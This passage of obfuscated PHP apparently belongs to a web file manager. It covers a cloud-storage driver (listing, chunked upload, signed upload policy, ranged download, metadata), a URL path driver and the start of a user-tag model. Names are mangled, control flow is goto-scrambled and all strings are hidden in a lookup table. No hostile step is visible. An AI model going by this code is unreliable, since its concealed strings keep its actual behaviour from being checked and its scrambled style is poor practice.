$this->fileInfo($a¤º¾“¦Î¢[$f„„ŞÒÌÖ[28]], $Fé£ÍâŠÓ , $a¤º¾“¦Î¢); } return array($f„„ŞÒÌÖ[74] => $d”âé­Û‘, $f„„ŞÒÌÖ[73] => $aÅ˜„†ã¯); } public function has($B¯¢ŠÌ­ˆÔ, $A¤šŸÛ÷‰ = false, $A‚…ªö„‰˜ = true) { goto AÛ¨Ú°õ­³; cä§ò‡Ôˆí: while (!0) { check_abort(); $eãƒ©³Şí— = $this->listObjs($B¯¢ŠÌ­ˆÔ, $C›Æ·´Œà†, $b¸áîÒ´®Ş); if (!$eãƒ©³Şí—) { return !1; } $C›Æ·´Œà† = isset($eãƒ©³Şí—[$bĞ–Ó‹öÆ«[1296]]) ? $eãƒ©³Şí—[$bĞ–Ó‹öÆ«[1296]] : $bĞ–Ó‹öÆ«[33]; $fÌ”Õì’ß× = isset($eãƒ©³Şí—[$bĞ–Ó‹öÆ«[1297]]) ? $eãƒ©³Şí—[$bĞ–Ó‹öÆ«[1297]] : array(); if (empty($fÌ”Õì’ß×)) { break; } $CàöÏ˜Ñ¬Ë = array_filter($fÌ”Õì’ß×, function ($a“»Ö¦ß¥¤) { $FéˆÉ¢äéŠ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; return $a“»Ö¦ß¥¤[$FéˆÉ¢äéŠ[29]] == $FéˆÉ¢äéŠ[76]; }); $e±Ü½Å Ú¬ = count($fÌ”Õì’ß×); $CàöÏ˜Ñ¬Ë = count($CàöÏ˜Ñ¬Ë); $Bñ·Ç‚‘éæ = $e±Ü½Å Ú¬ - $CàöÏ˜Ñ¬Ë; if ($A¤šŸÛ÷‰) { $fˆ±ÊÂÈîÜ += $CàöÏ˜Ñ¬Ë; $d×µÒ–Ÿ¿ += $Bñ·Ç‚‘éæ; if ($e±Ü½Å Ú¬ < $b¸áîÒ´®Ş) { break; } continue; } if ($A‚…ªö„‰˜) { if ($Bñ·Ç‚‘éæ) { return !0; } } else { if ($CàöÏ˜Ñ¬Ë) { return !0; } } if ($e±Ü½Å Ú¬ < $b¸áîÒ´®Ş) { break; } } if ($A¤šŸÛ÷‰) { return array($bĞ–Ó‹öÆ«[201] => $d×µÒ–Ÿ¿, $bĞ–Ó‹öÆ«[202] => $fˆ±ÊÂÈîÜ); } return !1; goto cìóÇÁÌÙ; AÛ¨Ú°õ­³: $bĞ–Ó‹öÆ« =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $C›Æ·´Œà† = $bĞ–Ó‹öÆ«[33]; $b¸áîÒ´®Ş = 500; goto c‰¼³¾§Š; c‰¼³¾§Š: $d×µÒ–Ÿ¿ = 0; $fˆ±ÊÂÈîÜ = 0; $E™ã®ŒåÎ = rtrim($B¯¢ŠÌ­ˆÔ, $bĞ–Ó‹öÆ«[8]) . $bĞ–Ó‹öÆ«[8]; goto cä§ò‡Ôˆí; cìóÇÁÌÙ: } public function listAll($d¯À…Ø´¯ù) { goto bƒ‹ä°›Å; d› Èóİãƒ: return $this->listAllFiles($d¯À…Ø´¯ù, array_keys($d“”´‚Şøª), $d“”´‚Şøª); goto eÓ¯ß´ÅÌÎ; c—ÉãØÑ×Œ: $d“”´‚Şøª = array(); foreach ($aï²›ØÀ½ as $Dœ–…åËöØ) { $d“”´‚Şøª[$Dœ–…åËöØ[$d½¨÷¡£©¼[28]]] = $Dœ–…åËöØ[$d½¨÷¡£©¼[77]]; } foreach ($B±É†î„º as $Dœ–…åËöØ) { if (is_string($Dœ–…åËöØ)) { $d“”´‚Şøª[$Dœ–…åËöØ] = 0; } } goto d› Èóİãƒ; bƒ‹ä°›Å: $d½¨÷¡£©¼ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $B±É†î„º = $aï²›ØÀ½ = array(); $this->fileList($d¯À…Ø´¯ù, $B±É†î„º, $aï²›ØÀ½, !0); goto c—ÉãØÑ×Œ; eÓ¯ß´ÅÌÎ: } public function canRead($D³¿… —¼á) { return $this->exist($D³¿… —¼á) ? !0 : !1; } public function canWrite($AÃ¿ŞƒÅ¤) { return $this->exist($AÃ¿ŞƒÅ¤) ? !0 : !1; } public function getContent($B¤¹§Ø“¯) { return $this->fileSubstr($B¤¹§Ø“¯, 0, -1); } public function setContent($F¥Êƒ³ÒÃ, $D‘ò†Â‹œÁ = '') { $FëÙÎÊëÔ¶ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if (!$D‘ò†Â‹œÁ) { $eôĞó ôøİ = $this->ussRequest($F¥Êƒ³ÒÃ, $FëÙÎÊëÔ¶[222]); return $eôĞó ôøİ[$FëÙÎÊëÔ¶[1037]]; } $fÁŒìƒ·„ = $this->tempFile($this->pathThis($F¥Êƒ³ÒÃ)); file_put_contents($fÁŒìƒ·„, $D‘ò†Â‹œÁ); if ($this->upload($F¥Êƒ³ÒÃ, $fÁŒìƒ·„)) { $this->tempFileRemve($fÁŒìƒ·„); return !0; } return !1; } public function fileSubstr($bäØ„¸µÚ, $CÕÕÚ÷°Ù¯, $Fô‰‚Ø¶Ãƒ) { $c©Ú…Şí…‘ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if (!($A…»õĞá˜ƒ = $this->link($bäØ„¸µÚ))) { return !1; } $B˜ĞŒˆâÍñ = !1; if ($Fô‰‚Ø¶Ãƒ > 0) { $B‰ÉÚŸ…¢¦ = $CÕÕÚ÷°Ù¯ + $Fô‰‚Ø¶Ãƒ - 1; $B˜ĞŒˆâÍñ = array($c©Ú…Şí…‘[1259] . $CÕÕÚ÷°Ù¯ . $c©Ú…Şí…‘[429] . $B‰ÉÚŸ…¢¦); } $BÎ¨±‚—œ¿ = url_request($A…»õĞá˜ƒ, $c©Ú…Şí…‘[226], !1, $B˜ĞŒˆâÍñ); return $BÎ¨±‚—œ¿[$c©Ú…Şí…‘[683]] ? $BÎ¨±‚—œ¿[$c©Ú…Şí…‘[1039]] : !1; } public function upload($eİŠôÒëøë, $eùºŒœ¾—¦, $bÌ òÚÏ¨ = false, $Câ³“‡ÀÍ = REPEAT_REPLACE) { goto FÃëöƒ£²; A’±ŠäÇ¯: $Cä÷öÒ±Åâ = $this->ussRequest($eİŠôÒëøë, $a™ù„öáğ†[224], !1, $dºå¡Œ´©); return $Cä÷öÒ±Åâ[$a™ù„öáğ†[1037]] ? $this->getPathOuter($AÛÁ¼­¶ĞÉ) : !1; goto fó†ÙÍèİî; FÃëöƒ£²: $a™ù„öáğ† =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $Aâˆƒ¨Àì  = IO::size($eùºŒœ¾—¦); if ($Aâˆƒ¨Àì  <= 1024 * 1024 * 200) { $aª†‚®Œİæ = array($a™ù„öáğ†[1299] . $eùºŒœ¾—¦); $Cä÷öÒ±Åâ = $this->ussRequest($eİŠôÒëøë, $a™ù„öáğ†[224], $aª†‚®Œİæ); return $Cä÷öÒ±Åâ[$a™ù„öáğ†[1037]] ? $this->getPathOuter($eİŠôÒëøë) : !1; } goto F”ÊÍˆÌ¼”; F”ÊÍˆÌ¼”: $Dö±«Æ­Ä‚ = 1024 * 1024 * 10; $dºå¡Œ´© = array($a™ù„öáğ†[1300], $a™ù„öáğ†[1301] . $Aâˆƒ¨Àì , $a™ù„öáğ†[1302], $a™ù„öáğ†[1303] . $Dö±«Æ­Ä‚); $Cä÷öÒ±Åâ = $this->ussRequest($eİŠôÒëøë, $a™ù„öáğ†[224], !1, $dºå¡Œ´©); goto cÊªä±àØÓ; c„ƒ‚Ü·¸: do { $F‰´³¾ã§Ä = $a¸ ï„Ñ§Ä[$a™ù„öáğ†[1305]]; fseek_64($e½ÊÊ®ğ’ğ, $C®É•›¾ÃÔ); $Aùµóç„¢È = fread($e½ÊÊ®ğ’ğ, $F‰´³¾ã§Ä); $CØÃŒù‰‘ñ = 0; do { $CØÃŒù‰‘ñ++; $a¸ ï„Ñ§Ä = $this->uploadPart($eİŠôÒëøë, $a¸ ï„Ñ§Ä, $Aùµóç„¢È); } while (!$a¸ ï„Ñ§Ä && $CØÃŒù‰‘ñ < 3); if (!$a¸ ï„Ñ§Ä) { return !1; } $e™®ìÅ›Ó = $a¸ ï„Ñ§Ä[$a™ù„öáğ†[1304]]; $C®É•›¾ÃÔ += $F‰´³¾ã§Ä; } while ($e™®ìÅ›Ó != -1); fclose($e½ÊÊ®ğ’ğ); $dºå¡Œ´© = array($a™ù„öáğ†[1306], $a™ù„öáğ†[1307] . $a¸ ï„Ñ§Ä[$a™ù„öáğ†[1308]], $a™ù„öáğ†[1302]); goto A’±ŠäÇ¯; cÊªä±àØÓ: if (!$Cä÷öÒ±Åâ[$a™ù„öáğ†[1037]]) { return !1; } $a¸ ï„Ñ§Ä = $Cä÷öÒ±Åâ[$a™ù„öáğ†[1039]]; $C®É•›¾ÃÔ = 0; goto F¤¡Äğğñ±; F¤¡Äğğñ±: $e™®ìÅ›Ó = $a¸ ï„Ñ§Ä[$a™ù„öáğ†[1304]]; $e½ÊÊ®ğ’ğ = fopen($eùºŒœ¾—¦, $a™ù„öáğ†[1209]); if (!$e½ÊÊ®ğ’ğ) { return !1; } goto c„ƒ‚Ü·¸; fó†ÙÍèİî: } private function uploadPart($fˆ×Ÿù¦¿ë, $E™ä×‹’¸, &$dô¸Ô˜·ÉŞ) { $fã¾øãñ¼ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $dƒÜâ¥›‚¡ = array($fã¾øãñ¼[1309], $fã¾øãñ¼[1307] . $E™ä×‹’¸[$fã¾øãñ¼[1308]], $fã¾øãñ¼[1310] . $E™ä×‹’¸[$fã¾øãñ¼[1304]], $fã¾øãñ¼[140] . $E™ä×‹’¸[$fã¾øãñ¼[1305]]); $C™¶‚ƒÂÌ = $this->ussRequest($fˆ×Ÿù¦¿ë, $fã¾øãñ¼[224], $dô¸Ô˜·ÉŞ, $dƒÜâ¥›‚¡); return !$C™¶‚ƒÂÌ[$fã¾øãñ¼[1037]] ? $C™¶‚ƒÂÌ[$fã¾øãñ¼[1037]] : $C™¶‚ƒÂÌ[$fã¾øãñ¼[1039]]; } public function uploadFormData($FÓÖÔ¤ˆÖâ, $Cïå‰£Ì® = 3600) { return $this->uploadPolicy($FÓÖÔ¤ˆÖâ, $Cïå‰£Ì®); } public function multiUploadFormData($FÅµŒÚ©ñö, $fàÇİ•‰ÍŒ = 3600) { $d¿ºœ¨œù· =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $c–« ×Ù«ß = (int) $GLOBALS[$d¿ºœ¨œù·[7]][$d¿ºœ¨œù·[77]]; return $this->uploadPolicy($FÅµŒÚ©ñö, $fàÇİ•‰ÍŒ, $c–« ×Ù«ß); } private function uploadPolicy($d­Ÿ‰“Ê¯, $A°„´Ë‹§ğ = 3600, $a¤çÓÙ‘¦ = 0) { goto aéŠ‹ôãæí; aéŠ‹ôãæí: $f¨ê›‚íì =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $E®‹£„¿†í = $f¨ê›‚íì[8] . $this->bucket; $Aé‚†‘²Ç… = gmdate($f¨ê›‚íì[1246]); goto D‡çìö¿Û; e’ö®«„õŞ: $fÓñåœùËÚ = base64_encode(hash_hmac($f¨ê›‚íì[1281], "\x50\x4f\123\x54\x26{$E®‹£„¿†í}\46{$Aé‚†‘²Ç…}\46{$aÌ„‘‹­à}", md5("{$this->userpass}"), !0)); $D–Î”£×ƒÄ = array($f¨ê›‚íì[1149] => $aÌ„‘‹­à, $f¨ê›‚íì[1315] => "\125\120\x59\125\116\40{$this->username}\x3a{$fÓñåœùËÚ}", $f¨ê›‚íì[175] => $this->endpoint . $E®‹£„¿†í); return $D–Î”£×ƒÄ; goto eêÂ¿¾ÔÒ; D‡çìö¿Û: $EÅ×²°˜… = array($f¨ê›‚íì[1311] => $this->bucket, $f¨ê›‚íì[1312] => $d­Ÿ‰“Ê¯, $f¨ê›‚íì[1313] => time() + $A°„´Ë‹§ğ, $f¨ê›‚íì[1314] => $Aé‚†‘²Ç…); if ($a¤çÓÙ‘¦) { $EÅ×²°˜…[$f¨ê›‚íì[1225]] = $a¤çÓÙ‘¦; } $aÌ„‘‹­à = base64_encode(json_encode($EÅ×²°˜…)); goto e’ö®«„õŞ; eêÂ¿¾ÔÒ: } public function download($c³«‚Á¿ß, $DØÆ‹ï‹²) { goto DŠ ²œ­Ø²; DŠ ²œ­Ø²: $d‘ƒ¡ï‘÷õ = IO::getPathInner(IO::mkfile($DØÆ‹ï‹²)); if (!($c„ê×ƒª‰¬ = $this->link($c³«‚Á¿ß))) { return !1; } $E™Šùâà¦º = 0; goto DÈæ­Ü¥¸¥; bœÌ½ÖèÅÆ: fclose($C’©¶Ôß²Š); return $DØÆ‹ï‹²; goto e‰”œêõ; DÈæ­Ü¥¸¥: $F‹÷Íƒ¶í¨ = 1024 * 200; $C’©¶Ôß²Š = fopen($d‘ƒ¡ï‘÷õ, $_SERVER[ó¬â¥‰ÊÔ¤Ç£][1265]); while (!0) { $bµñ–»šÃ = $this->fileSubstr($c³«‚Á¿ß, $E™Šùâà¦º, $F‹÷Íƒ¶í¨); if ($bµñ–»šÃ === !1) { return !1; } fwrite($C’©¶Ôß²Š, $bµñ–»šÃ); $E™Šùâà¦º += $F‹÷Íƒ¶í¨; if (strlen($bµñ–»šÃ) < $F‹÷Íƒ¶í¨) { break; } } goto bœÌ½ÖèÅÆ; e‰”œêõ: } public function link($eĞ„ïÊâà, $EƒÁÀ’ = array()) { $f»õŠ¦Éµ÷ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $eĞ„ïÊâà = trim($eĞ„ïÊâà, $f»õŠ¦Éµ÷[8]); if (!empty($this->token)) { $E‚Ù¹¨Æ = strtotime(date($f»õŠ¦Éµ÷[1316])); $BóêÇë‹­» = substr(md5($this->token . $f»õŠ¦Éµ÷[280] . $E‚Ù¹¨Æ . $f»õŠ¦Éµ÷[1317] . $eĞ„ïÊâà), 12, 8) . $E‚Ù¹¨Æ; $EƒÁÀ’[] = $f»õŠ¦Éµ÷[1318] . $BóêÇë‹­»; } $AñÂ×š¶Õ¤ = !empty($EƒÁÀ’) ? $f»õŠ¦Éµ÷[69] . implode($f»õŠ¦Éµ÷[280], $EƒÁÀ’) : $f»õŠ¦Éµ÷[33]; return $this->getHost() . $f»õŠ¦Éµ÷[8] . $eĞ„ïÊâà . $AñÂ×š¶Õ¤; } public function fileOut($dìô¢šòœø, $E¯ëØÅàÁ™ = false, $BãªêĞÇÂğ = false, $cˆ£àœŒÎ = '') { if ($this->isFileOutServer()) { return $this->fileOutServer($dìô¢šòœø, $E¯ëØÅàÁ™, $BãªêĞÇÂğ, $cˆ£àœŒÎ); } if (!$BãªêĞÇÂğ) { $BãªêĞÇÂğ = $this->pathThis($dìô¢šòœø); } $FÑŞÌˆò‘› = $E¯ëØÅàÁ™ ? array($_SERVER[ó¬â¥‰ÊÔ¤Ç£][1319] . rawurlencode($BãªêĞÇÂğ)) : array(); $b ñéÑ†‘ = $this->link($dìô¢šòœø, $FÑŞÌˆò‘›); $this->fileOutLink($b ñéÑ†‘); } public function fileOutServer($fŸİ¤¡×œÆ, $F‚Û×·ˆ±¿ = false, $Cçˆùâã‰ = false, $cÊÏëÏ¼é = '') { parent::fileOut($fŸİ¤¡×œÆ, $F‚Û×·ˆ±¿, $Cçˆùâã‰, $cÊÏëÏ¼é); } public function fileOutImage($EÑåï´¹ŒÙ, $CÜñã­Ú¶â = 250) { $dÎĞœ‡õç = $this->link($EÑåï´¹ŒÙ . $_SERVER[ó¬â¥‰ÊÔ¤Ç£][1320] . $CÜñã­Ú¶â); $this->fileOutLink($dÎĞœ‡õç); } public function fileOutImageServer($fí¦Œ©çë, $D±æâƒ¢öº = 250) { parent::fileOutImage($fí¦Œ©çë, $D±æâƒ¢öº); } public function hashMd5($CåÎ‚†‡³‹) { $bµ«Ã ìğ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $c°ÜÖ‰Á‘É = $this->_objectMeta($CåÎ‚†‡³‹); return isset($c°ÜÖ‰Á‘É[$bµ«Ã ìğ[206]]) ? $c°ÜÖ‰Á‘É[$bµ«Ã ìğ[206]] : !1; } public function size($f…Ô‹İœ¤Ğ) { $c”»·ãµ† = $this->objectMeta($f…Ô‹İœ¤Ğ); return $c”»·ãµ† ? $c”»·ãµ†[$_SERVER[ó¬â¥‰ÊÔ¤Ç£][77]] : 0; } public function info($D¶Üğ‡ƒ£) { if ($this->isFolder($D¶Üğ‡ƒ£)) { return $this->folderInfo($D¶Üğ‡ƒ£); } else { if ($this->isFile($D¶Üğ‡ƒ£)) { return $this->fileInfo($D¶Üğ‡ƒ£); } } return !1; } public function exist($aÖÀºğ»§Ò) { return $this->isFile($aÖÀºğ»§Ò) || $this->isFolder($aÖÀºğ»§Ò); } public function isFile($Fæ†¬õÙÁ) { return !$this->isFolder($Fæ†¬õÙÁ) && $this->objectMeta($Fæ†¬õÙÁ); } public function isFolder($eÛÙßÚ­Êà) { return $this->cacheMethod($_SERVER[ó¬â¥‰ÊÔ¤Ç£][197], $eÛÙßÚ­Êà); } protected function objectMeta($AÁÑƒÇæ“) { return $this->cacheMethod($_SERVER[ó¬â¥‰ÊÔ¤Ç£][198], $AÁÑƒÇæ“); } protected function _objectMeta($A­ééøÏäÆ) { goto Díò¯‹ÈÜ™; Díò¯‹ÈÜ™: $F•‰ÎµÓ„• =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if ($A­ééøÏäÆ == $F•‰ÎµÓ„•[33] || $A­ééøÏäÆ == $F•‰ÎµÓ„•[8]) { return array(); } $eÜ¿£õß¨ç = $this->ussRequest($A­ééøÏäÆ, $F•‰ÎµÓ„•[1321]); goto AƒØ©ê‚†; AƒØ©ê‚†: if (!$eÜ¿£õß¨ç[$F•‰ÎµÓ„•[1037]]) { return null; } $D¥ÛéÚØŠ¦ = isset($eÜ¿£õß¨ç[$F•‰ÎµÓ„•[1039]]) ? $eÜ¿£õß¨ç[$F•‰ÎµÓ„•[1039]] : array(); if (!isset($D¥ÛéÚØŠ¦[$F•‰ÎµÓ„•[1322]])) { return null; } goto Añ»ÊÈ½; Añ»ÊÈ½: $cŠ»î°êŒ = array($F•‰ÎµÓ„•[29] => isset($D¥ÛéÚØŠ¦[$F•‰ÎµÓ„•[1322]]) ? $D¥ÛéÚØŠ¦[$F•‰ÎµÓ„•[1322]] : null, $F•‰ÎµÓ„•[77] => isset($D¥ÛéÚØŠ¦[$F•‰ÎµÓ„•[1323]]) ? $D¥ÛéÚØŠ¦[$F•‰ÎµÓ„•[1323]] : null, $F•‰ÎµÓ„•[206] => isset($D¥ÛéÚØŠ¦[$F•‰ÎµÓ„•[1324]]) ? $D¥ÛéÚØŠ¦[$F•‰ÎµÓ„•[1324]] : null, $F•‰ÎµÓ„•[1291] => isset($D¥ÛéÚØŠ¦[$F•‰ÎµÓ„•[1325]]) ? $D¥ÛéÚØŠ¦[$F•‰ÎµÓ„•[1325]] : null); $cŠ»î°êŒ[$F•‰ÎµÓ„•[1292]] = isset($D¥ÛéÚØŠ¦[$F•‰ÎµÓ„•[1326]]) ? strtotime($D¥ÛéÚØŠ¦[$F•‰ÎµÓ„•[1326]]) : $cŠ»î°êŒ[$F•‰ÎµÓ„•[1291]]; return $cŠ»î°êŒ; goto CŒ¾äğê‡ã; CŒ¾äğê‡ã: } protected function _isFolder($Dœ¬Şá‘ëÅ) { $b–¹’ÊŞ™® =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if ($Dœ¬Şá‘ëÅ == $b–¹’ÊŞ™®[33] || $Dœ¬Şá‘ëÅ == $b–¹’ÊŞ™®[8]) { return !0; } $eˆŞÄÅêéÓ = $this->_objectMeta($Dœ¬Şá‘ëÅ); return isset($eˆŞÄÅêéÓ[$b–¹’ÊŞ™®[29]]) && $eˆŞÄÅêéÓ[$b–¹’ÊŞ™®[29]] == $b–¹’ÊŞ™®[76] ? !0 : !1; } } class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($AÔ‘î‚ä½Ã = false) { } public function exist($dé¦¢ÛçĞŠ) { $aïëÄÑô = $this->info($dé¦¢ÛçĞŠ); return $aïëÄÑô[$_SERVER[ó¬â¥‰ÊÔ¤Ç£][193]]; } public function isFile($A‹î‡·‚›) { $BäÖ¡¬½è = $this->info($A‹î‡·‚›); return $BäÖ¡¬½è[$_SERVER[ó¬â¥‰ÊÔ¤Ç£][193]]; } public function isFolder($F×‡£ï×²æ) { return !1; } public function size($e ä›ÀÖÚ) { $a¿¡ÏŠªíÌ = $this->info($e ä›ÀÖÚ); return $a¿¡ÏŠªíÌ[$_SERVER[ó¬â¥‰ÊÔ¤Ç£][77]]; } public function info($fÁáãƒæŸä) { return $this->infoParse($fÁáãƒæŸä); } public function infoAuth($F‡ª±ê™ğ) { return $this->infoParse($F‡ª±ê™ğ); } public function infoWithChildren($b°ÚŸøö˜‹) { return $this->infoParse($b°ÚŸøö˜‹); } public function infoFull($AÙ××ñ¿ì) { return $this->infoParse($AÙ××ñ¿ì); } private function infoParse($Fõí™ªèÓ) { $e–Ÿ ¾Å…Î =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $dÃÉ•—ŒØ = $this->header($Fõí™ªèÓ); if (!$dÃÉ•—ŒØ || !$dÃÉ•—ŒØ[$e–Ÿ ¾Å…Î[683]]) { return !1; } $DÁõÊ¦¾’Š = _get($dÃÉ•—ŒØ, $e–Ÿ ¾Å…Î[333], 0); $D¨›“®š» = array($e–Ÿ ¾Å…Î[28] => $dÃÉ•—ŒØ[$e–Ÿ ¾Å…Î[28]], $e–Ÿ ¾Å…Î[75] => $Fõí™ªèÓ, $e–Ÿ ¾Å…Î[29] => $e–Ÿ ¾Å…Î[173], $e–Ÿ ¾Å…Î[77] => intval($DÁõÊ¦¾’Š), $e–Ÿ ¾Å…Î[167] => get_path_ext($dÃÉ•—ŒØ[$e–Ÿ ¾Å…Î[28]]), $e–Ÿ ¾Å…Î[1206] => $DÁõÊ¦¾’Š > 0 && $dÃÉ•—ŒØ[$e–Ÿ ¾Å…Î[1327]], $e–Ÿ ¾Å…Î[1207] => !1); return $D¨›“®š»; } private function header($e×Ø©¢¿Ù´) { goto B„ƒ¿Š©ö»; B„ƒ¿Š©ö»: $Bº°‹ÇÂÉÆ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if (isset(self::$_cacheHeader[$e×Ø©¢¿Ù´])) { return self::$_cacheHeader[$e×Ø©¢¿Ù´]; } $Aİ‚ÕñÌŸ§ = isset($GLOBALS[$Bº°‹ÇÂÉÆ[1328]]) ? $GLOBALS[$Bº°‹ÇÂÉÆ[1328]] : !1; goto d‡ÁÀ©…Ş; aƒÓå½: return self::$_cacheHeader[$e×Ø©¢¿Ù´]; goto fÚ¥ÅÍ¢š¬; d‡ÁÀ©…Ş: $GLOBALS[$Bº°‹ÇÂÉÆ[1328]] = !0; self::$_cacheHeader[$e×Ø©¢¿Ù´] = url_header($e×Ø©¢¿Ù´); $GLOBALS[$Bº°‹ÇÂÉÆ[1328]] = $Aİ‚ÕñÌŸ§; goto aƒÓå½; fÚ¥ÅÍ¢š¬: } public function hashSimple($c¯‚íİ­Üù, $EÄÚ±™‰Ïæ = false) { goto aˆå®õŞŠ‘; c¹ï®¥Ùå³: $DÔƒ¬»ğÕ = $Dî…†®†¦Ş[$dõíø¼à£[77]]; $AÍÖÈ¿Ø³è = 200; $Dî²’¼Úö  = 50; goto dº´ë‚ÀËÙ; dÆ´á…Íªœ: $A§ù´¢Š = timeFloat(); $e˜Èí¯á©› = 15; for ($Cë¨‰ÄãªÄ = 0; $Cë¨‰ÄãªÄ < $Dî²’¼Úö ; $Cë¨‰ÄãªÄ++) { if (timeFloat() - $A§ù´¢Š > $e˜Èí¯á©›) { return !1; } $fİÌÕŒ¿¾Á = $this->fileSubstr($c¯‚íİ­Üù, $bƒÏÕ÷Ã‚è * $Cë¨‰ÄãªÄ, $AÍÖÈ¿Ø³è); if (!$fİÌÕŒ¿¾Á) { return !1; } $c–éõÛäù‘ .= $fİÌÕŒ¿¾Á; } goto cèÔ“½¢¼†; dº´ë‚ÀËÙ: if ($DÔƒ¬»ğÕ <= $AÍÖÈ¿Ø³è * $Dî²’¼Úö ) { return md5($this->fileSubstr($c¯‚íİ­Üù, 0, $DÔƒ¬»ğÕ)) . $DÔƒ¬»ğÕ; } $bƒÏÕ÷Ã‚è = intval($DÔƒ¬»ğÕ / $Dî²’¼Úö ); $c–éõÛäù‘ = $dõíø¼à£[33]; goto dÆ´á…Íªœ; aˆå®õŞŠ‘: $dõíø¼à£ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $Dî…†®†¦Ş = $this->info($c¯‚íİ­Üù); if (!$Dî…†®†¦Ş || !$Dî…†®†¦Ş[$dõíø¼à£[193]]) { return !1; } goto c¹ï®¥Ùå³; cèÔ“½¢¼†: $c–éõÛäù‘ .= $this->fileSubstr($c¯‚íİ­Üù, $DÔƒ¬»ğÕ - $AÍÖÈ¿Ø³è, $AÍÖÈ¿Ø³è); return md5($c–éõÛäù‘) . $DÔƒ¬»ğÕ; goto B˜½œ‰–È›; B˜½œ‰–È›: } public function getContent($Bè÷Ù£ñë­) { return $this->fileSubstr($Bè÷Ù£ñë­); } public function fileSubstr($c¦ŸßÃ”ÒÆ, $EËÔÈ§ß÷ = 0, $e‹Ÿ¸¥£‡ = -1) { goto Eõ™¢ ·½ò; Fø—µ¢Æ“‹: $b´øÑÜ§®¨ = url_request($c¦ŸßÃ”ÒÆ, $Cîï²ˆ•èË[226], !1, $fÛİ×¾öùß, !1, !1, 1); return $b´øÑÜ§®¨[$Cîï²ˆ•èË[1039]] ? $b´øÑÜ§®¨[$Cîï²ˆ•èË[1039]] : $Cîï²ˆ•èË[33]; goto dª‡´–…ß¤; Eõ™¢ ·½ò: $Cîï²ˆ•èË =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $f¨± ¦¹Ú = $this->info($c¦ŸßÃ”ÒÆ); if (!$f¨± ¦¹Ú || !$f¨± ¦¹Ú[$Cîï²ˆ•èË[193]] && $f¨± ¦¹Ú[$Cîï²ˆ•èË[77]] > 1024 * 1024 * 10) { return !1; } goto EÔ¡Ü¸óğ¸; EÔ¡Ü¸óğ¸: if ($e‹Ÿ¸¥£‡ === -1) { $e‹Ÿ¸¥£‡ = $f¨± ¦¹Ú[$Cîï²ˆ•èË[77]]; } if ($e‹Ÿ¸¥£‡ == 0) { return $Cîï²ˆ•èË[33]; } $fÛİ×¾öùß = array($Cîï²ˆ•èË[1329] . $EËÔÈ§ß÷ . $Cîï²ˆ•èË[709] . ($EËÔÈ§ß÷ + $e‹Ÿ¸¥£‡ - 1)); goto Fø—µ¢Æ“‹; dª‡´–…ß¤: } public function download($e”É“•ó‹½, $CÏö²•à) { Downloader::start($e”É“•ó‹½, $CÏö²•à); return $CÏö²•à; } } goto Eï¼„ã‰â; fùçŒ·ï…£: class UserTagModel extends ModelBaseLight { public $optionType = "\x55\x73\x65\x72\x2e\164\141\147\114\x69\x73\164"; public $modelType = "\125\163\145\162\117\160\x74\151\x6f\156"; public $field = array("\x6e\141\155\x65", "\x73\164\171\x6c\x65", "\163\157\162\x74"); public function listData($d˜’…¿›àİ = false, $eĞè±„Ÿé² = "\163\x6f\x72\164", $bàŞèÔÃ‹ = false) { return parent::listData($d˜’…¿›àİ, $eĞè±„Ÿé², $bàŞèÔÃ‹); } public function remove($A‹è‹¢—‰Å) { return parent::remove($A‹è‹¢—‰Å); } public function add($BãÒñÔ³¢µ, $B‹’ «—ä = "\x6c\x61\x62\x65\154\55\x67\162\x65\171\55\156\x6f\162\x6d\x61\154") { $f¿„‡“ƒ™µ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if ($this->findByName($BãÒñÔ³¢µ)) { return !1; } $F´óÄãäÙõ = array($f¿„‡“ƒ™µ[404] => $BãÒñÔ³¢µ, $f¿„‡“ƒ™µ[453] => $B‹’ «—ä, $f¿„‡“ƒ™µ[1642] => $this->getSort($f¿„‡“ƒ™µ[254]) + 1); return parent::insert($F´óÄãäÙõ); } public function update($A°ùà¨Ñë, $AÒ…ì¿ƒ‡£) { $fâÀ¯­ŒØ“ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $aØ«Óİöˆê = $this->listData($A°ùà¨Ñë); $D²¼ƒ©Ú¹á = $this->findByName($AÒ…ì¿ƒ‡£[$fâÀ¯­ŒØ“[28]]); if (!$aØ«Óİöˆê || $D²¼ƒ©Ú¹á && $D²¼ƒ©Ú¹á[$fâÀ¯­ŒØ“[385]] != $aØ«Óİöˆê[$fâÀ¯­ŒØ“[385]]) { return !1; } return parent::update($A°ùà¨Ñë, $AÒ…ì¿ƒ‡£); } public function moveTop($d›…Ï¿Ù) { $E–Ò¹ÒÏ±´ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $cÉ†ŸĞÏÂ¨ = parent::listData(); $EÅÉªÒ‹­ = $this->getSort($E–Ò¹ÒÏ±´[253]); foreach ($cÉ†ŸĞÏÂ¨ as &$FÌšÅ´»¨) { if ($FÌšÅ´»¨[$E–Ò¹ÒÏ±´[385]] == $d›…Ï¿Ù) { $FÌšÅ´»¨[$E–Ò¹ÒÏ±´[1661]] = $EÅÉªÒ‹­; continue; } $FÌšÅ´»¨[$E–Ò¹ÒÏ±´[1661]] += 1; } unset($FÌšÅ´»¨); return parent::resetData($cÉ†ŸĞÏÂ¨); } public function moveBottom($fâÂ‘ğ•Œå) { $f•°ŞİÊÓÛ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $FÎ£‡¨·‡— = $this->getSort($f•°ŞİÊÓÛ[254]) + 1; return 